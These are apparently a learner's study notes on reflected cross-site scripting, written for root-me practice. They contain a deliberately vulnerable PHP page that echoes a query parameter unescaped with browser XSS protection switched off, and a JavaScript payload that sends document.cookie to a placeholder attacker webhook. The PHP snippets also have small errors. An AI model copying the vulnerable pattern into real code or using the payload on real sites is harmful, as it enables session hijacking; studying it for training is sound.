# InfoSec related notes 

I have started to write down notes on security related resources I've been scanning.
This resource might be helpful for people just getting started with Information Security and for future blog posts by me.  

## License

[![CC BY-NC-SA 4.0](https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png)](http://creativecommons.org/licenses/by-nc-sa/4.0/)  

This work is licensed under a [Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-nc-sa/4.0/).  

## The Notes Themselves
> Influenced by LiveOverFlow's youtube channel, and some additional resources 
> Videos [here](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)
> root-me platform [here](https://root-me.org)  

[comment]: <> (description will be added)  

### Web - XSS
Written on Sep 6 2019
> Influenced by a plethora of tasks on  [rootme](https://root-me.org/)
> and a LOT of googling  

Note that in order to play with XSS, you need to disable browser protection,
The following php codes must include:  
`
header("X-XSS-Protection: 0");
`  
You can read about this at [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
The HTTP X-XSS-Protection response header is a feature of Internet Explorer, Chrome and Safari that stops pages from loading when they detect reflected cross-site scripting (XSS) attacks. Although these protections are largely unnecessary in modern browsers when sites implement a strong Content-Security-Policy that disables the use of inline JavaScript ('unsafe-inline'), they can still provide protections for users of older web browsers that don't yet support CSP.
Albeit this will be futher explained later at this note.  

Also, you can find payloads to play with at [HTML5 Security Cheatsheet](http://html5sec.org/)   

#### 1. XSS - reflected  
   It is recommended that you try to read more about this in the docs section of root-me and try to solve a challenge for practice.  
   Initial code:  
   ```php
   <?php 
   // header included here
   // you will need a php server to run the example 
   // you can use the default php server by running
   // php -s localhost:80
   // read more about php built-in we server here
   // https://www.php.net/manual/en/features.commandline.webserver.php
   ?>
   
   <html>
    <body>
        <h1> <?php echo "Hello".$GET['try']</h1>
        <!--
        This will output the concat result of Hello and what you supply as argument to the ?try parameter
        localhost:80/yourcode.php?try={payload later goes here}
        -->
    </body>
   </html>
   ```  
   supplying 
   ```javascript
   <script>console.log(1)</script>
   ``` 
   as input will be reflected in the webpage, thus the name **reflected Cross Site Scripting**  
   Of course writing to the console is boring, however this proves that we have code execution the context of the browser, an attacker may then leverage the full capabilities of JS with the ability to steal JS-accessible cookies which is usually the case for a session hijacking attack.  
   Read more about cookies and scoping [here](https://developer.mozilla.org/fr/docs/Web/API/Document/cookie)  
   Let's make our first payload. However, we will need some kind of session cookie. This can be done by  
   ```php
   <?php
   // Starting session
   // this will create cookies
   // you can them by viting the developer tools  
   session_start();
   ?>
   ```
   The session_start() function first checks to see if a session already exists by looking for the presence of a session ID. If it finds one, i.e. if the session is already started, it sets up the session variables and if doesn't, it starts a new session by creating a new session ID.  
   [official manual](https://www.php.net/manual/fr/function.session-start.php)  
   To our first test, let's try to steal the cookies:
   payload:
   ```javascript
   let element = document.createElement("img");
   element.setAttribute("src", "webhookurl/?"+document.cookie);
   document.body.appendChild(element);
   ```  
   The example above, gets the document cookie and appends it to the url of an attacker's controlled webhook.  
   _Note: Don't forget to urlencode_  
   for more advanced attack vectors try HTTP parameter pollution.  
   Read about that [here](https://www.owasp.org/index.php/4.8.1_Test_de_Reflected_Cross-Site_Scripting_(OTG-INPVAL-001))  
   Its time for you to go to rootme and play.  
   Additional for CTF creation: 
   **Check PhantomJS the scriptable headless browser, or selenium on python if you want to automate the behavior of a user**  
